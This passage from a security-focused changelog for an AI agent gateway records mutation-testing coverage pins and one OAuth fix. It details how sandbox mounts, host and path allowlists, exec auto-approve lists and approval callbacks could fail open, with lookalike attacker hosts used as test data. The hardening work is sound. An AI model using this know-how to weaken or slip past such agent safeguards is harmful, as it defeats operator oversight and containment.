  for back-compat — the explicit host is used verbatim) resolves to a concrete
  listen host at gateway start, BEFORE the bind-safety guard, so a non-loopback
  bind (`lan`/`tailnet`) is held to the same no-token-no-start rule as any other
  public bind; `tailnet` degrades to loopback when the tailnet is unreachable.
  `gateway.tailscale` = `{ mode: "off"|"serve"|"funnel", resetOnExit: false }`.
- Safety coupling (`coupleTailscaleExposure`, applied at config load): choosing
  `serve`/`funnel` pins the gateway to loopback (Tailscale is the single front
  door — binding LAN/tailnet under a live public Funnel would bypass it), and
  `funnel` additionally forces `gateway.authStrict = true`. A public Funnel is
  never written without a gateway token (one is generated at onboarding if none
  exists). Overrides are recorded on `_tailscaleCoupling` for honest doctor/log
  reporting.
- Onboarding: `xclaw init` / `xclaw onboard` asks for the exposure interactively
  (off/serve/funnel), warns if the `tailscale` binary is missing (setup still
  completes), pins loopback and offers reset-on-exit, and guarantees a gateway
  token for funnel.
- Gateway wiring: `resolveGatewayBindHost` sets the effective listen host before
  the bind guard; `startGatewayTailscaleExposure` brings the route up AFTER the
  socket is listening (and appends the tailnet HTTPS origin to an existing
  `corsOrigin` allowlist); the route is reset on shutdown when `resetOnExit` is
  set.
- Tests: `test/net-tailscale.test.mjs` (+34) — exact serve/funnel/reset argv,
  noisy-JSON parse, host/IP resolution (DNSName trailing-dot strip, IP fallback),
  whois `{login,name}` extraction + TTL cache (60s success / 5s error),
  bind-host resolution for every mode, coupling invariants (off no-op / serve
  loopback / funnel authStrict), and the exposure orchestrator (off→null,
  missing-binary→inactive, success→active, funnel-port warning). Full suite
  green (3711/0).
- Docs: `docs/TAILSCALE.md`, plus the documented follow-ups left for a later
  slice (tailnet identity-header auth via `readTailscaleWhoisIdentity`; the
  live auth/CORS paths are untouched by this slice).

## 3.239.0 (2026-08-26)

- SECURITY coverage pin (mutation sweep #56): the OS sandbox (bubblewrap) mounts
  the host system directories (`/usr`, `/etc`, `/bin`, `/sbin`, `/lib*`) into the
  sandbox namespace READ-ONLY so a sandboxed agent command cannot tamper with
  system binaries or config. `roBindDirsArgv()` in `src/security/os-sandbox.mjs`
  is the single source of those mounts (spliced into the assembled bwrap argv at
  the "RO system paths" step, `:256`, and reused by both usability probes so the
  probe filesystem view matches the real sandbox). The read-only FLAG on those
  mounts was asserted by NO test: flipping `--ro-bind` → `--bind` on `:94` makes
  every system directory WRITABLE inside the production sandbox for any operator
  who enables it, yet the FULL suite stayed green (3675/0) under exactly that
  mutation — the read-only containment of the sandbox system mounts was entirely
  unpinned.
- Proof: `roBindDirsArgv:94 --ro-bind → --bind` (system dirs writable in the
  production sandbox) left the full suite GREEN 3675/0 (blind spot proven);
  restored byte-identical (sha256 unchanged); a real out-of-process bwrap run
  with the correct argv confirmed the enforcement is genuine end-to-end
  (`touch /usr/...` inside the sandbox → "Read-only file system", host `/usr`
  untouched). Shipping code is UNCHANGED — this is a coverage pin, not a fix.
- Pin: `test/os-sandbox-ro-mounts.test.mjs` (+2) asserts every triple emitted by
  `roBindDirsArgv` is `--ro-bind` (and never writable `--bind`) with matching
  src/dst, and that the assembled production argv keeps `/usr` read-only while
  binding the workspace writable. Mutation-verified both directions: correct
  code 2/2 GREEN, the `--bind` mutant 2/2 RED. NEW RULE reinforced: a per-path
  mount MODE flag (`--ro-bind` vs `--bind`) is its own enforcement line — tests
  that assert a path is *present* in the argv do not assert it is *read-only*.

## 3.238.0 (2026-08-26)

- SECURITY fix (mutation sweep #55): the in-flight MCP OAuth pending map
  (`src/gateway/routes/mcp.mjs`) enforced its 10-minute flow TTL only at
  `/mcp/oauth/start` (`gcPending()` ran there alone). The two consume handlers —
  `/mcp/oauth/callback` (GET) and `/mcp/oauth/complete` (POST) — checked only
  `!flow`, never the flow age. `/mcp/oauth/callback` is auth-exempt
  (`gateway/auth.mjs:70`) and its ONLY authentication is the one-time `state`
  bounded by that TTL (per the handler's own comment). A flow started, abandoned
  past 10 minutes, then completed with no intervening `/start` was therefore
  redeemable for the entire gateway process lifetime — a captured `state`+`code`
  pair (AS-side logs, a Referer header, a proxy log, or an interrupted redirect
  that never reached the operator's browser) reached the PKCE token exchange and
  stored a grant, well past the documented window. The TTL bound on an
  auth-exempt endpoint's sole credential was documented but never enforced at
  consume time.
- Proof: a new test ages a real pending flow 11 minutes past the TTL and drives
  both consume handlers with a VALID mocked token endpoint. Against the unfixed
  code the stale flow was accepted (200) and reached the exchange at BOTH paths
  (full suite otherwise green — a fail-open, not a covered regression).
- Fix: call the existing `gcPending()` sweep at the top of both consume handlers,
  so an aged flow is evicted before lookup and falls through to the existing
  "expired" reject branch (callback → "Login link expired" 400; complete →
  "unknown or expired state" 400) before any code exchange. A fresh flow is
  unaffected. `test/mcp-oauth-flow-ttl.test.mjs` (+3 subtests) is
  mutation-verified both directions and per-handler: removing either handler's
  `gcPending()` reddens only that handler's subtest.

## 3.237.0 (2026-08-26)

- SECURITY test-coverage (mutation sweep #54; shipping code
  `src/gateway/routes/providers.mjs` is UNCHANGED — sha256
  `87b6131604026a33ea8b9d90ef9605ade02c23a9d1f25dce84e229a287a5ab62` before and
  after). Pins the expiry arm of the provider web-OAuth complete handler's
  single consume-time guard: `if (!pending || Date.now() - pending.at >
  OAUTH_TTL_MS)` (`providers.mjs:295`) rejects a pasted auth code whose pending
  PKCE flow has aged past the 10-minute TTL. `sweepOauthPending()` runs only on
  `/oauth/start` (:261), so a user who starts a flow, waits past the TTL, then
  pastes the code with no intervening start is gated ONLY here — this is the sole
  live TTL enforcement on a stale PKCE verifier + state at the point it is
  redeemed.
- Blind spot (RULE(b) composite gate): every existing test hit the OTHER arm of
  this `||` — an unknown/consumed state (`!pending` short-circuits true) or a
  fresh pending (age ~0), so none ever drove the expiry arm true. Mutating the
  expiry arm to always-false (accept a stale flow — fail OPEN) left the full
  suite green (3671/0).
- Fix: `test/providers-oauth-web.test.mjs` starts a flow with a frozen clock,
  advances Date.now 11 minutes past the TTL, then completes with a VALID token
  endpoint mocked — asserting the flow is rejected 400 `not found or expired`
  and the token exchange is never reached (`fetchCalled === false`). RED when the
  expiry arm is dropped (the stale flow reaches the exchange and succeeds 200).
  +1 test.

## 3.236.0 (2026-08-26)

- SECURITY test-coverage (mutation sweep #53; shipping code
  `src/gateway/stop-auth.mjs` is UNCHANGED — sha256
  `73d23e9a80a3621ebdf7d23c1200afabf2baf7b93136063a735b21acdc3ff11c` before and
  after). Pins the length-validation arm of the kill-switch HMAC second factor:
  `hmacEqual()` rejects any `X-XClaw-Stop-Sig` that does not decode to exactly 32
  bytes (`if (a.length !== 32 || b.length !== 32) return false;` —
  `stop-auth.mjs:31`) before `crypto.timingSafeEqual`. This is the line that refuses
  an empty / short / non-hex / over-long signature on a stopHmac-secret gateway, so a
  caller holding the stop token but not the HMAC secret cannot forge a `POST /stop`
  (also WS/SSE stop-control) by omitting or mangling the sig.
- Blind spot: the stop suite only ever sent a valid-LENGTH signature to a secret-set
  gateway — `stop-hmac.test.mjs`'s "rejects bad signature" uses `"00".repeat(32)`
  (exactly 32 bytes), so the guard is never taken and `timingSafeEqual` does the
  rejecting. Mutating `stop-auth.mjs:31` `return false` -> `return true` (accept a
  malformed signature — fail OPEN) left the full suite green (3665/0).
- Fix: `test/stop-hmac-malformed-sig.test.mjs` presents a valid token plus a
  malformed signature (empty, one-byte, odd-length hex, non-hex, 64-byte) and
  asserts each is rejected `STOP_HMAC_INVALID`, with a valid-signature positive
  control. RED when the guard is weakened to accept a malformed sig, RED when
  inverted to reject a valid one. +6 tests.

## 3.235.0 (2026-08-26)

- SECURITY test-coverage (mutation sweep #52; shipping code
  `src/gateway/auth.mjs` is UNCHANGED — sha256
  `6ddaa4d3612ba77b5d38fadab319629da320938aebef4babb9d212865adef862` before and
  after). Structurally pins the operator-token protection of the `/complete`
  code-completion route (`src/gateway/routes/completion.mjs`, wired at
  `index.mjs:1299`), a POST that spends provider tokens on every call — its gate
  arm is `p === "/complete"` in `isProtectedPath` (`src/gateway/auth.mjs:157`).
- Blind spot: the served-inventory guard (`test/gateway-served-inventory.test.mjs`)
  proves every ROUTER-served path literal is protected-or-justified, but its
  extraction regex captured only `=== "/x"` and `.startsWith("/x")`. Route files
  that dispatch with an early-return guard name their served path through `!==`
  (`if (p !== "/complete") return false;` — completion.mjs, objectives.mjs), so
  `/complete` never entered the served set and NO test pinned its auth. Mutating
  the gate arm `p === "/complete"` → `false` (so an unauthenticated caller could
  spend provider tokens via POST `/complete`) left the FULL suite GREEN
  (`# tests 3664 / # fail 0`) — the blind spot, proven.
- Catch: the extraction regex now also captures `!== "/x"`
  (`(?:===|!==|\.startsWith\()`), bringing `/complete`, `/objectives`,
  `/cron/eval`, `/cron/eval/run` into the served set — all four already protected
  by `isProtectedPath`, so the suite stays green on correct code while any future
  drop of one of their gate arms fails here with its own path. Mutation-verified
  both directions: correct code → `/complete — protected` passes (191/191);
  mutated (`false`) → `not ok - /complete — protected` (190/1). Full suite
  `# tests 3664 / # fail 0 / NODE_EXIT=0`.
- Fixes the extraction oracle rather than adding a one-off assertion (capability
  over feature): the whole `!==`-guard class of served routes is now covered, not
  just `/complete`.

## 3.234.0 (2026-08-26)

- SECURITY test-coverage (mutation sweep #51; shipping code
  `src/planes/search.mjs` is UNCHANGED — sha256
  `f95a132b4c7649ddcb6e040c2ad05b1e2f47806b29b9db86e5d3b9827d3640b1` before and
  after). Pins the subdomain-boundary guard of `isSearchHostAllowed`
  (`src/planes/search.mjs:27`), the RULE(a) matcher
  `host === h || host.endsWith("." + h)` behind the search plane's egress
  allowlist (`SEARCH_ALLOW_HOSTS`: brave + duckduckgo).
- Blind spot: `isSearchHostAllowed` is the sole gate in `allowedFetch`
  (`src/planes/search.mjs:39`), which every search-plane HTTP fetch
  (`braveSearch` / `ddgSearch`, reached by the `web_search` tool via
  `runWebSearch`) must pass. The only host-reject test used DISJOINT hosts
  (`evil.example`, `google.com`) and the accept test an exact match — neither
  exercises the dot boundary. Dropping `"." +` (so `.endsWith(h)`) left the FULL
  suite GREEN (`# tests 3662 / # fail 0`): a lookalike sharing an allowlisted
  host as a bare trailing substring (`evilduckduckgo.com` vs `duckduckgo.com`,
  `evilapi.search.brave.com` vs `api.search.brave.com`) would then pass the
  egress allowlist, letting the `web_search` tool fetch from an
  attacker-registered host — search-query exfiltration plus attacker-controlled
  results injected into agent reasoning (SSRF).
- Catch: +2 tests in `test/search-plane.test.mjs` — two lookalikes
  (`evilduckduckgo.com`, `evilapi.search.brave.com`) must be REFUSED, plus a
  real-subdomain (`foo.duckduckgo.com`) ADMIT (green both ways). Mutation-verified
  both directions: correct code → 7/7 green; mutated (`.endsWith(h)`) → the
  lookalike-reject test RED (`not ok 4`). Full suite
  `# tests 3664 / # fail 0 / NODE_EXIT=0`.
- RULE(a) reaffirmed: coverage does NOT transfer across distinct call sites of an
  identical suffix-boundary matcher shape — this is the 6th such site pinned
  (after shell-egress, route-filename, exec-allowlist glob, secure-inject, and
  git remote-host), on a new axis: search-plane egress.

## 3.233.0 (2026-08-26)

- SECURITY test-coverage (mutation sweep #50; shipping code
  `src/git/remote-url.mjs` is UNCHANGED — sha256
  `f743f22192014f5eab21dc108fb53ec28e2059b63e93a8f06fde9a98f1bf2104` before and
  after). Pins the subdomain-boundary guard of `hostAllowed`
  (`src/git/remote-url.mjs:268`), the RULE(a) matcher
  `h === x || h.endsWith("." + x)` behind git remote-host allowlisting.
- Blind spot: `hostAllowed` gates `validateGitRemoteUrl` / `validateGitRemotes`,
  reached in enforcement via `xclaw doctor` (`src/cli/doctor.mjs:509`,
  `allowedHosts: cfg.git?.allowedRemoteHosts`) and the worktree remote check
  (`src/agents/worktree.mjs:61`). The only host-reject test used a DISJOINT host
  (`evil.example`) and the admit test a real subdomain — neither exercises the
  dot boundary. Dropping `"." +` (so `.endsWith(x)`) left the FULL suite GREEN
  (`# tests 3660 / # fail 0`): a lookalike sharing the allowlisted host as a bare
  trailing substring (`evilgithub.com` vs `github.com`) would then pass the
  operator's allowlist, letting a repo remote — and the credentials/pushes bound
  to it — reach an attacker-registered host that `doctor` reports as compliant.
- Catch: +2 tests in `test/git-remote-url.test.mjs` — a lookalike
  (`evilgithub.com`, allowlist `["github.com"]`) must be REFUSED
  (`REMOTE_URL_HOST_NOT_ALLOWED`), plus a real-subdomain (`api.github.com`) ADMIT
  (green both ways). Mutation-verified both directions: correct code → 14/14
  green; mutated (`.endsWith(x)`) → the lookalike-reject test RED (`not ok 11`).
  Full suite `# tests 3662 / # fail 0 / NODE_EXIT=0`.
- RULE(a) reaffirmed: coverage does NOT transfer across distinct call sites of an
  identical suffix-boundary matcher shape — this is the 5th such site pinned
  (after shell-egress, route-filename, exec-allowlist glob, and secure-inject).

## 3.232.0 (2026-08-26)

- TEST-DETERMINISM (fixes a CI-flaky test; shipping code
  `src/security/decisions.mjs` is UNCHANGED). The unit test `wide pins expire and
  match by exe+argv0` (`test/security-decisions.test.mjs`) failed the `ci` gate on
  the sweep-#49 tip (run 32956726501, `# fail 1` of 3654): `not ok 3`,
  `AssertionError: wide pin matches different fingerprint with same exe`,
  `expected: true, actual: undefined` at `:54`.
- Root cause: the test created ONE wide pin with `ttlMs: 50`, then immediately
  asserted a live match. The exe/argv0/tool/tier all match, so `matchDecision`
  returning `undefined` is reachable by EXACTLY one path — `pruneExpired`
  (`decisions.mjs:44`) dropped the pin as already-expired because the async fs
  round-trip (`mkdir`+`writeFile`+`rename`+read) landed the "still live" read
  >50ms after the write. Under the full parallel suite's event-loop contention
  in CI that window routinely exceeds 50ms; in isolation it never does (30/30
  local runs under 12 spinners: 0 fails), which is why it surfaced only in CI.
- Fix (test-only): split the two concerns so neither assertion can race the
  round-trip. The LIVE-match uses a 60s TTL (cannot lapse mid-round-trip); the
  EXPIRY check uses a separate 1ms-TTL pin on a DISTINCT exe (`/usr/bin/gitx`) —
  expiry is monotonic (more contention only makes it MORE expired), and the
  distinct exe prevents the still-live pin from masking the expected null.
- Proof: mechanism reproduced deterministically against the real API — `ttlMs=50`
  + a 60ms stall → `NULL(pruned-expired)` (the CI `actual: undefined`); `ttlMs=60000`
  + the same stall → `MATCH`. Test count unchanged (one `it` block retained). Full
  suite green.

## 3.231.0 (2026-08-26)

- TEST-COVERAGE (sweep #49 — a coverage pin, NOT a behavior change; the shipping
  enforcement source `src/channels/telegram/callback-auth.mjs` is unchanged and its
  sha256 is byte-identical before and after: `59ff0f2e…`). Enforcement family: the
  Telegram inline-callback authorization allowlist OR (`authorizeTelegramCallback`,
  `src/channels/telegram/callback-auth.mjs:46`) — `inAllow = allow.includes(fromId)
  || allow.includes(chatId)`, a two-principal grant judging whether a `sug`/`pair`/
  `apr` inline callback is authorized.
- Why it matters: `inAllow` gates three sites — the sug/allowlist deny (`:49`), the
  sug/pairing deny (`:53`), and the PRIVILEGED pair|apr allow (`:72`, which re-runs a
  pending action's approve/deny). `fromId` is the USER who tapped; `chatId` is
  `cq.message.chat.id` (the GROUP). The OR intentionally authorizes a callback when
  EITHER the individual user OR the whole chat is allowlisted — the same two-principal
  semantics the sibling `isApproved` OR (`:53`) carries for pairing.
- Blind spot proven: the `isApproved` OR's two arms ARE pinned (by-chat, by-from
  isolated tests), but coverage does NOT transfer to this sibling `inAllow` OR —
  every `inAllow`-exercising test collapses `chatId === fromId` (`9/9`, `88/88`,
  `3/3`) or uses `allowFrom:[]` (inAllow ≡ false), so NEITHER arm was isolated.
  Dropping the chatId arm (`inAllow = allow.includes(fromId)`) left the FULL suite
  green (3657/0); dropping the fromId arm (`inAllow = allow.includes(chatId)`) did
  too. A silent narrowing of allowlist authorization from "the CHAT is allowlisted
  OR the USER is allowlisted" down to a single principal would ship unnoticed — e.g.
  a refactor dropping the chatId arm would revoke every group-allowlisted member's
  ability to activate suggestions or approve pending actions.
- RULE(b)/RULE(c) applied to a sibling allowlist predicate: coverage of one
  two-principal OR's arms does not transfer to a DISTINCT OR on the same
  (fromId, chatId) axis; each arm needs isolation via `chatId !== fromId` with only
  one principal in `allowFrom`. Three tests isolate the chatId arm (at the sug deny
  AND the privileged apr allow) and the fromId arm (at the sug deny). Each reddens
  ONLY its targeted arm-drop mutation (mut-chatId → 2 fail, mut-fromId → 1 fail);
  correct code → all green. +3 tests (3657 → 3660).

## 3.230.0 (2026-08-26)

- TEST-COVERAGE (sweep #48 — a coverage pin, NOT a behavior change; the shipping
  enforcement source `src/auth/secure-inject.mjs` is unchanged and its sha256 is
  byte-identical before and after: `1177173336e0…`). Enforcement family: the
  cookie-injection host allowlist matcher (`isHostAllowed`,
  `src/auth/secure-inject.mjs:32-39`) — `h === x || h.endsWith("." + x)`, the
  boundary that decides which target host may receive injected Grok/xAI SESSION
  COOKIES.
- Why it matters: `buildSecureInjectPlan` gates both the page URL (`:68`) and every
  per-cookie `Domain` (`:96`) through `isHostAllowed` before session cookies are
  written into a browser context. The `"." +` is the subdomain-boundary guard: a
  host whose NAME merely shares an allowlisted domain's trailing string (allow
  `grok.com`, host `evilgrok.com`; allow `x.ai`, host `notx.ai`) is NOT a subdomain
  of it and must be REFUSED — otherwise credentials are injected into an
  attacker-registered lookalike host.
- Blind spot proven: every pre-existing test hit either the exact-match arm
  (`grok.com` === `grok.com`) or a fully disjoint reject (`evil.com` /
  `evil.example` / `.evil.com`), so NONE exercised the suffix boundary. Dropping
  `"." +` (→ `endsWith(x)`) left the FULL suite green (3654/0). This is RULE(a)'s
  hostname suffix-boundary discipline (already carried by the email-sender and
  egress gates) re-proven at this distinct call site, because coverage does NOT
  transfer across the call sites of an identical matcher shape.
- Fix (test-only): `test/secure-inject.test.mjs` gains a `describe` pinning the
  sibling REJECT (`evilgrok.com`, `notx.ai` → not allowlisted; lookalike page URL
  → inject plan throws) with a real-subdomain ADMIT (`accounts.grok.com` → allowed,
  green both ways). Mutation-verified BOTH directions: correct → pass; mutated
  (`endsWith(x)`) → the two sibling-reject tests RED. Suite 3654 → 3657.

## 3.229.0 (2026-08-26)

- TEST-COVERAGE (sweep #47 — a coverage pin, NOT a behavior change; the shipping
  enforcement source `src/security/sandbox.mjs` is unchanged and its sha256 is
  byte-identical before and after: `2dbf88f4…`). Enforcement family: the
  workspace-sandbox allowPaths root matcher (`resolveSandboxPath`,
  `src/security/sandbox.mjs:37-39`) — `norm === root || norm.startsWith(root + path.sep)`,
  the boundary that decides whether an absolute path outside the workspace is
  admitted because it falls under an operator-allowlisted root.
- Why it matters: `allowPaths` is how an operator whitelists absolute roots
  outside the workspace (e.g. `/tmp`, a shared data dir); every file/exec tool
  path flows through `guardToolPaths → resolveSandboxPath`, so this matcher is the
  containment boundary for allowlisted roots. The trailing `+ path.sep` is the
  sibling-prefix guard: a directory whose NAME merely shares an allow-root's
  string prefix (allow `/tmp/safe`, path `/tmp/safe-evil`) is NOT inside the
  allowed root and must be refused as an escape.
- The blind spot (RULE(a) path-prefix analogue): the existing `sandbox-tmp-allow`
  test admits a REAL subpath (`/tmp` + sep + name) and denies with empty
  allowPaths, but no test drove a shared-prefix SIBLING of a non-empty allow-root.
  Dropping `+ path.sep` (`startsWith(root + path.sep)` → `startsWith(root)`) left
  the FULL suite green (3652/0) — a silent widening of containment so that any
  directory sharing an allowlisted root's name prefix is admitted: a `/data/safe`
  allowlist would leak writes into `/data/safe-secrets`.
- Fix (test only): `test/sandbox-tmp-allow.test.mjs` now pins the sibling REJECT
  (allow `/tmp/safe`, path `/tmp/safe-evil/leak.txt` → throws "escapes
  workspace") — mutation-verified RED under the dropped-separator mutation — plus
  a real-subpath ADMIT (`/tmp/safe/ok.txt`) that is green in both directions, the
  path-prefix mirror of RULE(a)'s hostname suffix-boundary discipline (a matched
  reject + a matched admit isolating the separator).
- Suite: 3654/3654, 0 fail (+2). Shipping code byte-identical (sha `2dbf88f4…`).

## 3.228.0 (2026-08-26)

- TEST-COVERAGE (sweep #46 — a byte-identical coverage pin, NOT a behavior
  change; the shipping enforcement source is unchanged and its sha256 is
  identical before and after: `59ff0f2e…`). Enforcement family: the
  user-principal approval arm of the Telegram inline `sug` callback gate
  (`src/channels/telegram/callback-auth.mjs:53`) — `isApproved("telegram",
  fromId)`, the arm that authorizes an approved USER to activate a suggestion
  even in a chat that is not itself paired.
- Why it matters: tapping a `sug` button re-injects its prompt as a user message
  and RUNS the agent, so `authorizeTelegramCallback` is the authorization gate on
  that action. Under `dmPolicy: "pairing"` it ORs three approval arms —
  `isApproved(chatId) || isApproved(fromId) || inAllow` — over DISTINCT principals:
  in a GROUP callback `fromId` is the user who tapped while `chatId` is
  `cq.message.chat.id` (the group). The `isApproved(fromId)` arm is what lets an
  approved user act in a not-yet-paired group.
- The blind spot (RULE(c) axis — chatId vs fromId): the sibling `isApproved(chatId)`
  arm was isolated by a test (fromId 777 unpaired, chat 42 paired), but the
  `isApproved(fromId)` arm was not — the one test labeled "isApproved-by-from arm"
  used chatId===fromId===500, so the chatId arm masks it. No test drove the
  isolating scenario: an approved SENDER in an un-paired GROUP chat.
- Proof (mutation): dropping the arm (removing `&& !isApproved("telegram", fromId)`
  from the deny predicate) left the FULL suite GREEN 3651/3651/0 — a silent removal
  of user-level pairing authorization, downgrading "an approved user may act in any
  chat" to "only approved chats may act", would ship unnoticed. Under the mutation
  exactly the one new test reddens (14→1 fail on that file); on the restored
  byte-identical code it passes.
- Fix (test only), RULE(c): `test/telegram-callback-auth.test.mjs` drives an
  approved user (fromId 500) tapping a `sug` button in a DISTINCT un-paired group
  chat (chatId 42, not approved, empty allowFrom) and asserts ALLOW via
  `sug_policy` — carried by the fromId arm alone, the mirror of the existing
  chatId-arm test.
- Suite: 3652/3652, 0 fail (was 3651; +1).

## 3.227.0 (2026-08-26)

- TEST-COVERAGE (sweep #45 — a byte-identical coverage pin, NOT a behavior
  change; the shipping enforcement source is unchanged and its sha256 is
  identical before and after: `c008124a…`). Enforcement family: the revoked-
  GENERATION arm of `isRevoked` (`src/auth/key-compromise-recovery.mjs:137-142`),
  the branch that denies a signing key whose entire GENERATION was deny-listed —
  distinct from the revoked-KID arm on the line above (#44 pinned the kid path).
- The blind spot: an operator can revoke a whole key generation without naming
  individual kids — `revokeKids({ generations: [g] })` — e.g. when a generation's
  private material is suspect but the live kid must keep signing. `isRevoked` is
  wired into TWO enforcement consumers: the inbound `verifyWithRecovery` path
  (rejects a still-valid signature whose generation is revoked) and the outbound
  `exportJwks` publish path (drops such a key from the JWKS). Every existing
  revocation test revoked by KID only; the one recovery test that reaches
  KEY_REVOKED does so via the SEPARATE `revokedPublicKeys` crypto loop after the
  dual window is closed (`verifyWithRotatedKeys` fails first), never through the
  generation arm. So the generation branch fired nowhere in the suite.
- Proof (mutation): neutralizing the arm (`if (false && ...)`) left the FULL
  suite GREEN 3648/3648/0 — a signature from a still-active key whose generation
  was revoked would be silently ACCEPTED, and such a key would remain in the
  published JWKS. Under the mutation exactly the two new SECURITY tests redden
  (verify path + publish path), 14→2 fail on the two affected files; on the
  restored byte-identical code both pass.
- Fix (test only), RULE(k) — pin EACH wired consumer:
  `test/key-compromise-recovery.test.mjs` signs with the current key, revokes its
  GENERATION (not the kid) with no rotation/window-close so the key stays active,
  and asserts `verifyWithRecovery` returns `KEY_REVOKED` for the matching
  generation+kid (plus a scoped-negative: an unrelated revoked generation does not
  reject a good signature). `test/jwks.test.mjs` rotates to a dual window, revokes
  the previous GENERATION only, and asserts the previous kid is ABSENT from the
  re-exported JWKS (count 2→1, current kid still present).
- Suite: 3651/3651, 0 fail (was 3648; +3).

## 3.226.0 (2026-08-26)

- TEST-COVERAGE (sweep #44 — a byte-identical coverage pin, NOT a behavior
  change; the shipping enforcement source is unchanged and its sha256 is
  identical before and after: `5a5dd077…`). Enforcement family: the revoked-key
  filter in `exportJwks` (`src/auth/jwks.mjs:102-110`), which excludes a revoked
  (compromise-recovered) kid from the JWKS document that XClaw publishes for
  verifiers.
- The blind spot: this is a real auth boundary — a verifier that fetches the
  JWKS keeps trusting whatever kids it lists, so a revoked/compromised key MUST
  be dropped from the export or the compromise is not contained. `isRevoked` had
  ZERO test references by name, and although `exportJwks` is tested, every case
  used only NON-revoked keys ("dual window exports two keys" asserts a count of 2,
  but neither key is revoked), so the `if (await isRevoked(...)) continue;` skip
  never fired anywhere in the suite. No jwks test file contained the string
  "revok" at all.
- Proof (mutation): neutralizing the skip so a revoked kid stays published
  (`if (false && await isRevoked(...))`) left the FULL suite GREEN 3646/3646/0 —
  the revocation filter was entirely unpinned; a silent removal would ship a
  compromised key in the JWKS unnoticed.
- Fix (test only): `test/jwks.test.mjs` revokes one kid of a dual-window pair via
  `revokeKids`, then asserts the revoked kid is ABSENT from the re-exported JWKS
  (count drops 2→1, the non-revoked kid still present), and pins the
  `filterRevoked:false` opt-out (a revoked kid stays published, count 2). Verified
  BOTH directions: passes on the restored byte-identical code and the
  revoked-kid-excluded assertion reddens (`# pass 9 # fail 1`) under the line-104
  fail-open mutation.
- Suite: 3648/3648, 0 fail (was 3646; +2).

## 3.225.0 (2026-08-26)

- TEST-COVERAGE (sweep #43 — a byte-identical coverage pin, NOT a behavior
  change; the shipping enforcement source is unchanged and its sha256 is
  identical before and after: `cdf6fc85…`). Enforcement family: the glob
  slash-boundary in `compileGlobRegex`
  (`src/security/exec-allowlist-pattern.mjs:74`), which decides whether a command
  is covered by the exec allowlist (auto-approve) or must pend. A single `*`
  compiles to `[^/]*` (matches within ONE path segment, does NOT cross `/`);
  `**` compiles to `.*` (crosses `/`, any depth).
- The blind spot: this is a real auth boundary — a directory-scoped allowlist
  pattern like `~/scripts/*` is meant to auto-approve only what sits DIRECTLY in
  that dir, NOT an arbitrarily nested `~/scripts/sub/evil`. The design comment on
  `commandMatchesExecAllowlist` explicitly leans on `ls*` compiling to `ls[^/]*`.
  Yet `matchesExecAllowlistPattern` had ZERO test references, and every test in
  `exec-allowlist.test.mjs` used bare-prefix patterns (`ls*`, `cat*`) whose
  targets contain no `/`; the compound-rejection cases (`ls | curl` → false) fail
  via SEGMENTATION, not via the slash-boundary. So the boundary itself was
  unpinned.
- Proof (mutation): changing `[^/]*` to `.*` (single `*` now crosses `/`,
  auto-approving nested paths under a top-level allowlist pattern) left the FULL
  suite GREEN 3643/3643/0 — the fail-open was entirely unpinned.
- Fix (test only): `test/exec-allowlist.test.mjs` pins the boundary at the raw
  matcher seam (single `*` matches `/srv/allowed/tool` but NOT
  `/srv/allowed/sub/evil`; `**` matches the nested path) AND through the wired
  caller (`commandMatchesExecAllowlist` with a cwd: a dir-scoped `/srv/allowed/*`
  pattern covers a top-level command but NOT a nested `sub/evil`, while
  `/srv/allowed/**` covers it). Verified BOTH directions: passes on the restored
  byte-identical code and the two nested-must-not-match assertions redden
  (`# pass 9 # fail 2`) under the line-74 fail-open mutation.
- Suite: 3646/3646, 0 fail (was 3643; +3).

## 3.224.0 (2026-08-26)

- TEST-COVERAGE (sweep #42 — a byte-identical coverage pin, NOT a behavior
  change; the shipping enforcement line is unchanged and its sha256 is identical
  before and after: `59ff0f2e…`). Enforcement family: the Telegram inline-callback
  authorization gate for admin/approval buttons (`pair` / `apr`) in
  `authorizeTelegramCallback` (`src/channels/telegram/callback-auth.mjs:73`). An
  `apr` tap re-runs a pending risky action's approve/deny; a `pair` tap completes
  device pairing — so this is a sender-authorization gate on privileged actions,
  not cosmetic.
- The blind spot: in a deployment with NO `ownerChatId` set and a non-`open`
  dmPolicy (the DEFAULT `pairing`, or `allowlist`), the ONLY authorized path for a
  `pair`/`apr` callback is allowlist membership (line 72). A non-allowlisted
  tapper — e.g. another member of a group chat who can see the inline
  Approve/Deny keyboard — must be DENIED at line 73. That ACCEPT sibling (line 72)
  was pinned ("allowlist can apr without owner"), but the DENY arm had ZERO test:
  every other `pair`/`apr` case either sets an owner (→ owner-mismatch deny, line
  62), is allowlisted (→ allow, line 72), or uses the `open` policy (→ its own
  deny, line 66), so none reached line 73.
- Proof (mutation): flipping line 73 to `{ ok: true, via: "MUT" }` (a fail-open
  that would let any group member approve/deny another user's pending action)
  left the FULL suite GREEN 3639/3639/0 — the fail-open was entirely unpinned.
- Fix (test only): `test/telegram-callback-auth.test.mjs` adds a 2×2 matrix
  (`apr`/`pair` × `pairing`/`allowlist`) asserting a no-owner, non-allowlisted
  sender is denied with code `CALLBACK_DENY`. Verified BOTH directions: the 4 new
  subtests pass on the restored byte-identical code and all 4 redden (`# pass 10
  # fail 4`) under the line-73 fail-open mutation.
- Suite: 3643/3643, 0 fail (was 3639; +4).

## 3.223.0 (2026-08-26)

- TEST-COVERAGE (sweep #41 — a byte-identical coverage pin, NOT a behavior
  change; the shipping enforcement source is unchanged and its sha256 is
  identical before and after: `934c0aec…`). Enforcement family: the contents of
  the prod/supervised auto-approve lists produced by `buildProdSecurityOverlay()`
  (`src/security/policy-matrix.mjs:43`) — the SOLE producer of
  `security.safeAuto` / `security.requireApproval` for the `supervised` overlay,
  applied on every `prod` OR `dev` profile via `autonomyOverlay("supervised")` →
  `applyAutonomyLevel` whenever the operator has not hand-tuned those keys.
- The blind spot: the overlay deliberately does NOT set `autoApproveMaxTier`, so
  in a prod/supervised config the gate's `effectiveMaxTier` is null →
  `needsApproval`'s risk-tier path (`src/security/approvals.mjs:281`) is skipped
  and the LEGACY path governs. There, `safeAuto.has(n)` (line 290) is an
  UNCONDITIONAL auto-approve short-circuit and only listed `requireApproval`
  names pend (line 302). So the list CONTENTS are the whole auto-approval
  decision in prod — yet `policy-matrix.mjs` had ZERO test references (direct or
  indirect): nothing asserted the list membership, and no test drove a
  prod-overlay gate to prove a dangerous tool actually pends because of it.
- Proof (mutation): widening the safeAuto filter from `r === "safe"` to
  `r === "safe" || r === "exec"` leaked `bash`/`xclaw_bash`/`shell` into the prod
  auto-approve list (exec tools auto-running unapproved under supervised mode);
